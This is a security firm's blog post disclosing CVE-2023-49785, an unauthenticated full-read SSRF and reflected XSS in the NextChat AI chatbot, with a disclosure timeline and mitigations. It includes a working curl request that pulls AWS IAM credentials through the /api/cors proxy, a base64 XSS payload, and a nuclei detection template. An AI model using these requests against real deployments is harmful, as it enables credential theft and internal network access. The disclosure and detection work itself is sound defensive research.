

[Skip to main content](#brx-content)
[Skip to footer](#brx-footer)
[![Renmoe Library](https://www.horizon3.ai/wp-content/uploads/2024/11/Horizon3ai_Logo_Tagline_Horizontal_RGB-WhiteTxt_NoTag.png)](https://www.horizon3.ai)

* Solutions
  + Security Strategies
  + [→ Effective Security](/effectivesecurity)
  + [→ Splunk Logging](https://www.horizon3.ai/for-splunk/)
  + [→ Purple Team Culture](https://www.horizon3.ai/purple-team-culture/)
  + [→ Vulnerable ≠ Exploitable](https://www.horizon3.ai/vulnerable-not-exploitable/)
  + [NodeZero for Compliance](https://www.horizon3.ai/compliance/)
  + [→ PCI Complinace](https://www.horizon3.ai/compliance/pci-pentesting/)
  + [→ NIS 2 Compliance](https://www.horizon3.ai/compliance/nis-2-compliance/)
  + [The NodeZero™ Platform](https://www.horizon3.ai/nodezero/)
  + [→ Internal Pentesting](https://www.horizon3.ai/nodezero/continuous-internal-pentesting/)
  + [→ External Pentesting](https://www.horizon3.ai/nodezero/external-pentesting/)
  + [→ Kubernetes Pentesting](https://www.horizon3.ai/nodezero/kubernetes-pentesting/)
  + [→ Cloud Pentesting](https://www.horizon3.ai/nodezero/cloud-pentesting/)
  + [→ Rapid Response](https://www.horizon3.ai/nodezero/rapid-response/)
  + [→ NodeZero Insights](https://www.horizon3.ai/nodezero/insights/)
  + [→ AD Password Audit](https://www.horizon3.ai/nodezero/nodezero-ad-password-audit/)
  + [→ Phishing Impact Testing](https://www.horizon3.ai/nodezero/phishing-impact-testing/)
  + [→ NodeZero Tripwires](https://www.horizon3.ai/nodezero/nodezero-tripwires/)
  + [Documentation](https://docs.horizon3.ai/getting_started/)
  + Use Cases
  + [→ Public Sector](https://www.horizon3.ai/use-case/nodezero-in-the-public-sector/)
  + [→ Education](https://www.horizon3.ai/use-case/nodezero-in-education/)
  + [→ Healthcare](https://www.horizon3.ai/use-case/for-healthcare/)
  + [→ Manufacturing](https://www.horizon3.ai/use-case/nodezero-in-manufacturing/)
  + [→ Supply Chain](https://www.horizon3.ai/use-case/nodezero-for-supply-chain/)
  + [→ Large Organizations](/who-uses-nodezero#large-org)
  + [→ MSSP and MSP](https://www.horizon3.ai/partners/mssp-msp/)
  + [Who Uses NodeZero?](https://www.horizon3.ai/who-uses-nodezero/)
  + [→ ITOps and SecOps](/who-uses-nodezero#itops)
  + [→ Security Teams](/who-uses-nodezero#security-teams)
  + [→ Pentesters](/who-uses-nodezero#pentesters)
* Partners
  + [MSSPs and MSPs](https://www.horizon3.ai/partners/mssp-msp/)
  + [Partners](https://www.horizon3.ai/partners/)
  + [Become A Partner](https://www.horizon3.ai/partners#become-a-partner-form)
  + [Partner Portal](https://partners.horizon3.ai/)
* Resources
  + [Resource Center](https://www.horizon3.ai/resource-center/)
  + [Attack Research](https://www.horizon3.ai/category/attack-research/)
  + [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Customer Stories](https://www.horizon3.ai/category/customer-story/)
  + [Webinar Replays](https://www.horizon3.ai/category/intelligence/webinars/)
  + [Credential Attacks](https://www.horizon3.ai/credentialattacks/)
  + [Log4Shell](https://www.horizon3.ai/log4shell/)
  + [Ransomware Impact](https://www.horizon3.ai/ransomware/)
  + [Glossary](https://www.horizon3.ai/resource-center/glossary/)
  + [Simplify Compliance with NodeZero: CMMC, DFARS, and NIST 800-171](https://www.horizon3.ai/intelligence/blogs/simplify-compliance-with-nodezero-cmmc-dfars-and-nist-800-171/)

    January 6, 2025  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Securing Financial Services: 5 Critical Cybersecurity Advantages of NodeZero](https://www.horizon3.ai/intelligence/infographics/securing-financial-services-5-critical-cybersecurity-advantages-of-nodezero/)

    January 3, 2025  |  [Infographics](https://www.horizon3.ai/category/intelligence/infographics/)
  + [NodeZero Insights™: Proof Over Promises in Cybersecurity](https://www.horizon3.ai/intelligence/blogs/nodezero-insights-proof-over-promises-in-cybersecurity/)

    December 17, 2024  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Uncover Kubernetes Security Weaknesses with NodeZero™](https://www.horizon3.ai/intelligence/webinars/uncover-kubernetes-security-weaknesses-with-nodezero/)

    December 13, 2024  |  [Webinar Replays](https://www.horizon3.ai/category/intelligence/webinars/)
* Company
  + [Our Vision](https://www.horizon3.ai/horizon3-security-vision/)
  + [Meet The Team](https://www.horizon3.ai/about-us/)
  + [Join The Team](https://www.horizon3.ai/join-our-team/)
  + [Awards](https://www.horizon3.ai/category/news/awards/)
  + [Press Releases](https://www.horizon3.ai/category/news/press-release/)
  + [Contact Us](https://www.horizon3.ai/contact-us/)
  + [Upcoming Events](https://www.horizon3.ai/events/)
* [Log In](https://portal.horizon3ai.com/)
* Try NodeZero
  + [Get A Demo](https://www.horizon3.ai/contact-us/schedule-demo/)
  + [Free Trial](https://portal.horizon3ai.com/)

* Solutions
  + Security Strategies
  + [→ Effective Security](/effectivesecurity)
  + [→ Splunk Logging](https://www.horizon3.ai/for-splunk/)
  + [→ Purple Team Culture](https://www.horizon3.ai/purple-team-culture/)
  + [→ Vulnerable ≠ Exploitable](https://www.horizon3.ai/vulnerable-not-exploitable/)
  + [NodeZero for Compliance](https://www.horizon3.ai/compliance/)
  + [→ PCI Complinace](https://www.horizon3.ai/compliance/pci-pentesting/)
  + [→ NIS 2 Compliance](https://www.horizon3.ai/compliance/nis-2-compliance/)
  + [The NodeZero™ Platform](https://www.horizon3.ai/nodezero/)
  + [→ Internal Pentesting](https://www.horizon3.ai/nodezero/continuous-internal-pentesting/)
  + [→ External Pentesting](https://www.horizon3.ai/nodezero/external-pentesting/)
  + [→ Kubernetes Pentesting](https://www.horizon3.ai/nodezero/kubernetes-pentesting/)
  + [→ Cloud Pentesting](https://www.horizon3.ai/nodezero/cloud-pentesting/)
  + [→ Rapid Response](https://www.horizon3.ai/nodezero/rapid-response/)
  + [→ NodeZero Insights](https://www.horizon3.ai/nodezero/insights/)
  + [→ AD Password Audit](https://www.horizon3.ai/nodezero/nodezero-ad-password-audit/)
  + [→ Phishing Impact Testing](https://www.horizon3.ai/nodezero/phishing-impact-testing/)
  + [→ NodeZero Tripwires](https://www.horizon3.ai/nodezero/nodezero-tripwires/)
  + [Documentation](https://docs.horizon3.ai/getting_started/)
  + Use Cases
  + [→ Public Sector](https://www.horizon3.ai/use-case/nodezero-in-the-public-sector/)
  + [→ Education](https://www.horizon3.ai/use-case/nodezero-in-education/)
  + [→ Healthcare](https://www.horizon3.ai/use-case/for-healthcare/)
  + [→ Manufacturing](https://www.horizon3.ai/use-case/nodezero-in-manufacturing/)
  + [→ Supply Chain](https://www.horizon3.ai/use-case/nodezero-for-supply-chain/)
  + [→ Large Organizations](/who-uses-nodezero#large-org)
  + [→ MSSP and MSP](https://www.horizon3.ai/partners/mssp-msp/)
  + [Who Uses NodeZero?](https://www.horizon3.ai/who-uses-nodezero/)
  + [→ ITOps and SecOps](/who-uses-nodezero#itops)
  + [→ Security Teams](/who-uses-nodezero#security-teams)
  + [→ Pentesters](/who-uses-nodezero#pentesters)
* Partners
  + [MSSPs and MSPs](https://www.horizon3.ai/partners/mssp-msp/)
  + [Partners](https://www.horizon3.ai/partners/)
  + [Become A Partner](https://www.horizon3.ai/partners#become-a-partner-form)
  + [Partner Portal](https://partners.horizon3.ai/)
* Resources
  + [Resource Center](https://www.horizon3.ai/resource-center/)
  + [Attack Research](https://www.horizon3.ai/category/attack-research/)
  + [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Customer Stories](https://www.horizon3.ai/category/customer-story/)
  + [Webinar Replays](https://www.horizon3.ai/category/intelligence/webinars/)
  + [Credential Attacks](https://www.horizon3.ai/credentialattacks/)
  + [Log4Shell](https://www.horizon3.ai/log4shell/)
  + [Ransomware Impact](https://www.horizon3.ai/ransomware/)
  + [Glossary](https://www.horizon3.ai/resource-center/glossary/)
  + [Simplify Compliance with NodeZero: CMMC, DFARS, and NIST 800-171](https://www.horizon3.ai/intelligence/blogs/simplify-compliance-with-nodezero-cmmc-dfars-and-nist-800-171/)

    January 6, 2025  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Securing Financial Services: 5 Critical Cybersecurity Advantages of NodeZero](https://www.horizon3.ai/intelligence/infographics/securing-financial-services-5-critical-cybersecurity-advantages-of-nodezero/)

    January 3, 2025  |  [Infographics](https://www.horizon3.ai/category/intelligence/infographics/)
  + [NodeZero Insights™: Proof Over Promises in Cybersecurity](https://www.horizon3.ai/intelligence/blogs/nodezero-insights-proof-over-promises-in-cybersecurity/)

    December 17, 2024  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Uncover Kubernetes Security Weaknesses with NodeZero™](https://www.horizon3.ai/intelligence/webinars/uncover-kubernetes-security-weaknesses-with-nodezero/)

    December 13, 2024  |  [Webinar Replays](https://www.horizon3.ai/category/intelligence/webinars/)
* Company
  + [Our Vision](https://www.horizon3.ai/horizon3-security-vision/)
  + [Meet The Team](https://www.horizon3.ai/about-us/)
  + [Join The Team](https://www.horizon3.ai/join-our-team/)
  + [Awards](https://www.horizon3.ai/category/news/awards/)
  + [Press Releases](https://www.horizon3.ai/category/news/press-release/)
  + [Contact Us](https://www.horizon3.ai/contact-us/)
  + [Upcoming Events](https://www.horizon3.ai/events/)
* [Log In](https://portal.horizon3ai.com/)
* Try NodeZero
  + [Get A Demo](https://www.horizon3.ai/contact-us/schedule-demo/)
  + [Free Trial](https://portal.horizon3ai.com/)

![](https://www.horizon3.ai/wp-content/uploads/2024/03/Screenshot-2024-03-06-at-11.12.26 PM-768x629.png)

# NextChat: An AI Chatbot That Lets You Talk to Anyone You Want To

Naveen Sunkavally  |  March 11, 2024  |  [Attack Blogs](https://www.horizon3.ai/category/attack-research/attack-blogs/), [Disclosures](https://www.horizon3.ai/category/attack-research/disclosures/)

With the advent of generative AI, AI chatbots are everywhere. While users can chat with large-langage models (LLMs) using a SaaS provider like OpenAI, there are [lots of standalone chatbot applications](https://github.com/JStumpp/awesome-chatbots) available for users to deploy and use too. These standalone applications generally offer a richer user interface than OpenAI, additional features such as the ability to plug in and test different models, and the ability to potentially bypass IP block restrictions.

From our research, the most widely deployed standalone Gen AI chatbot is [NextChat, a.k.a ChatGPT-Next-Web](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web). This is a GitHub project with 63K+ stars and 52K+ forks. The Shodan query  `title:NextChat,"ChatGPT Next Web"` pulls up 7500+ exposed instances, mostly in China and the US.

This application is vulnerable to a critical full-read server-side request forgery (SSRF) vulnerability, [CVE-2023-49785](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-49785), that we disclosed to the vendor in November 2023. As of this writing, there is no patch for the vulnerability, and since 90+ days has passed since our original disclosure, we are now releasing full details here.

![](https://www.horizon3.ai/wp-content/uploads/2024/03/Screenshot-2024-03-06-at-6.23.30 PM.png)

### CVE-2023-49785: A Super SSRF

NextChat is a Next.js-based Javascript application, and most of its functionality is implemented as client-side code.

![](https://www.horizon3.ai/wp-content/uploads/2024/03/Screenshot-2024-03-06-at-11.12.26 PM.png)

There are, however, a few exposed server endpoints. One of these endpoints is at [/api/cors](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web/blob/main/app/api/cors/%5B...path%5D/route.ts), and it functions by design as an open proxy, allowing unauthenticated users to send arbitrary HTTP requests through it. This endpoint appears to have been added to support saving client-side chat data to WebDAV servers. The presence of this endpoint is an anti-pattern: it allows clients to bypass built in browser protections for accessing cross-domain resources by accessing them through a server-side endpoint instead.

![](https://www.horizon3.ai/wp-content/uploads/2024/03/Screenshot-2024-03-06-at-11.09.54 PM.png)

For instance to access Google through this proxy, one can make the following request:

![](https://www.horizon3.ai/wp-content/uploads/2024/03/Screenshot-2024-03-06-at-11.22.18 PM.png)

SSRF vulnerabilities vary considerably in terms of real-world impact. This particular SSRF is about as bad as it gets. It’s dangerous because:

* It enables access to arbitrary HTTP endpoints, including any internal endpoints
* It returns the full response from any accessed HTTP endpoints
* It supports arbitrary HTTP methods such as POST, PUT, etc by setting the `method` header. Request bodies are also passed along.
* URL query parameters can be passed along with URL encoding.
* It supports passing along an `Authorization` header in requests.

If this application is exposed on the Internet, an attacker essentially has full access to any other HTTP resources accessible in the same internal network as the application. The only limitation is passing along other headers such as `Cookie` or `Content-Type`, though there may be creative ways to inject these headers.

Here’s an example of accessing the AWS cloud metadata service to retrieve AWS access keys off an AWS EC2 instance running with IMDSv1 enabled:

![](https://www.horizon3.ai/wp-content/uploads/2024/03/Screenshot-2024-03-07-at-7.39.03 PM.png)

```
sh-3.2# curl http://54.145.48.76:3000/api/cors/http/169.254.169.254/latest/meta-data/iam/security-credentials/REDACTED
{
  "Code" : "Success",
  "LastUpdated" : "2024-03-08T00:22:17Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA-REDACTED",
  "SecretAccessKey" : "C2CW-REDACTED",
  "Token" : "IQoJb3JpZ2luX2VjENH-REDACTED",
  "Expiration" : "2024-03-08T06:58:15Z"
}
```
### Reflected XSS

Almost all reflected XSS vulnerabilities are of little value to attackers. But we thought it was interesting to note that this vulnerability can be used to directly trigger an XSS *without loading another site.* This is because the `fetch` method used by the `/api/cors` endpoint also supports the `data` protocol.

For instance, the following payload:

`data:text%2fhtml;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+%23`

will be decoded to `<script>alert(document.domain)</script>` at the server and sent back to the client, resulting in XSS:

![](https://www.horizon3.ai/wp-content/uploads/2024/03/Screenshot-2024-03-07-at-8.51.50 AM.png)

### Mitigations

Our assessment of this vulnerability puts the CVE base score at [9.1](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) (critical). The vulnerability not only enables read access to internal HTTP endpoints but also write access using HTTP POST, PUT, and other methods. Attackers can also use this vulnerability to mask their source IP by forwarding malicious traffic intended for other Internet targets through these open proxies.

As of this writing, there is no patch for the vulnerability. More than 90 days has passed since our original contact.

* **Nov. 25, 2023**: Horizon3 reports security issue to [ChatGPT-Next-Web](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web) via GitHub vulnerability disclosure process
* **Nov. 26, 2023**: Vendor accepts the report
* **Dec. 6, 2023**: GitHub CNA reserves CVE-2023-49785
* **Jan. 15, 2024**: Horizon3 asks vendor for an update using the GitHub security issue. No response.
* **Mar. 7, 2024**: Horizon3 asks vendor for an update using the GitHub security issue. No response.
* **Mar. 11, 2024**: Public disclosure

We recommend that users not expose this application on the Internet. If it must be exposed to the Internet, ensure it is an isolated network with no access to any other internal resources. Beware that attackers can still use the application as an open proxy to disguise malicious traffic to other targets through it.

### Detection

The following nuclei template can be used to detect this vulnerability. The vulnerable code was introduced in Sept. 2023. The majority of instances online, including any instances using the more recent “NextChat” name, are highly likely to be vulnerable.

```
id: CVE-2023-49785

info:
  name: CVE-2023-49785
  author: nvn1729
  severity: critical
  description: Full-Read SSRF/XSS in NextChat, aka ChatGPT-Next-Web
  remediation: |
    Do not expose to the Internet
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cve-id: CVE-2023-49785
  tags: cve-2023-49785,ssrf,xss

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/cors/data:text%2fhtml;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+%23"
      - "{{BaseURL}}/api/cors/http:%2f%2fnextchat.{{interactsh-url}}%23"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS interaction from second request
        words:
          - "dns"

      - type: dsl
        dsl:
          - 'contains(body_1, "<script>alert(document.domain)</script>") && contains(header_1, "text/html")' # XSS validation in first request
          - 'contains(header_2, "X-Interactsh-Version")' # Or got HTTP response back from Interact server

```
### Conclusion

Over the last two years, we have observed the rapid pace of development of new generative AI applications, and there is a big appetite to use and experiment with these applications. We’ve also observed a steady blurring of lines between personal use and corporate use. While NextChat is primarily meant for personal use, we’ve seen it in a few of our own client environments.

Security has simply not kept up, both AppSec practices and vulnerability disclosure processes. The focus of the infosec community and media at large has been on “security harms” like prompt injection or model poisoning, but there are lots of high impact, conventional vulnerabilities to be found. We recommend users exercise caution when exposing any unvetted Gen AI tools to the Internet.

### References

* [NextChat, a.k.a ChatGPT-Next-Web](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web)

##### Sign up for a free trial and quickly verify you’re not exploitable.

[Start Your Free Trial](https://portal.horizon3ai.com)

##### How can NodeZero help you?

Let our experts walk you through a demonstration of NodeZero, so you can see how to put it to work for your company.[Get a Demo](https://www.horizon3.ai/contact-us/schedule-demo/)Share:

[![Renmoe Library](https://www.horizon3.ai/wp-content/uploads/2021/06/h3-white-logo.png)](https://www.horizon3.ai)Contact Us

### Subscribe to Community Updates

###### NodeZero Solution

* [NodeZero Overview](https://www.horizon3.ai/nodezero/)
* [Internal Pentesting](https://www.horizon3.ai/nodezero/continuous-internal-pentesting/)
* [Kubernetes Pentesting](https://www.horizon3.ai/nodezero/kubernetes-pentesting/)
* [External Pentesting](https://www.horizon3.ai/nodezero/external-pentesting/)
* [Cloud Pentesting](https://www.horizon3.ai/nodezero/cloud-pentesting/)
* [NodeZero Insights](https://www.horizon3.ai/nodezero/insights/)
* [Rapid Response](https://www.horizon3.ai/nodezero/rapid-response/)
* [AD Password Audit](https://www.horizon3.ai/nodezero/nodezero-ad-password-audit/)
* [Phishing Impact Testing](https://www.horizon3.ai/nodezero/phishing-impact-testing/)
* [NodeZero Tripwires](https://www.horizon3.ai/nodezero/nodezero-tripwires/)
* [NodeZero Documentation](https://docs.horizon3.ai/getting_started/)
* [Pentesting for Compliance](https://www.horizon3.ai/compliance/)
* [Pentesting for PCI Compliance](https://www.horizon3.ai/compliance/pci-pentesting/)
* [Pentesting for NIS 2 Compliance](https://www.horizon3.ai/compliance/nis-2-compliance/)
###### Resources

* [Blog](https://www.horizon3.ai/category/intelligence/blogs/)
* [Attack Research](https://www.horizon3.ai/category/attack-research/)
* [White Papers](https://www.horizon3.ai/category/downloads/whitepapers/)
* [Fact Sheets](https://www.horizon3.ai/category/downloads/factsheets/)
* [Case Studies](https://www.horizon3.ai/category/customer-story/)
* [Glossary](https://www.horizon3.ai/resource-center/glossary/)
###### Use Cases

* [Education](https://www.horizon3.ai/use-case/nodezero-in-education/)
* [Healthcare](https://www.horizon3.ai/use-case/for-healthcare/)
* [Manufacturing](https://www.horizon3.ai/use-case/nodezero-in-manufacturing/)
* [Public Sector](https://www.horizon3.ai/use-case/nodezero-in-the-public-sector/)
* [Supply Chain](https://www.horizon3.ai/use-case/nodezero-for-supply-chain/)
* [Large Organization](/who-uses-nodezero/#large-org/)
* [MSSPs and MSPs](https://www.horizon3.ai/partners/mssp-msp/)
* [DIB Suppliers](https://www.horizon3.ai/nsa-capt-program-for-dib-suppliers/)
* [On AWS Marketplace](https://www.horizon3.ai/horizon3-ai-and-aws/)
###### Roles

* [ITOps and SecOps](/who-uses-nodezero/#itops)
* [Security Teams](/who-uses-nodezero/#security-teams)
* [Consulting Pentester](/who-uses-nodezero/#pentesters)
###### Partners

* MSSPs and MSPs
* [Become a Partner](https://www.horizon3.ai/partners/)
* [Partner Portal](https://partners.horizon3.ai/)
###### Company

* [About Us](https://www.horizon3.ai/about-us/)
* [Careers](https://www.horizon3.ai/join-our-team/)
* [Press](https://www.horizon3.ai/category/news/press-release/)
* [Awards](https://www.horizon3.ai/category/news/awards/)
* [Contact](https://www.horizon3.ai/contact-us/)
* [Upcoming Events](https://www.horizon3.ai/events/)
© 2024 All Rights Reserved.
[Privacy Policy](https://www.horizon3.ai/privacy-policy/)[Support Policy](https://www.horizon3.ai/support-policy/)[Terms of Service](https://www.horizon3.ai/terms-of-service/)[Trust Center](https://trust.horizon3.ai/)

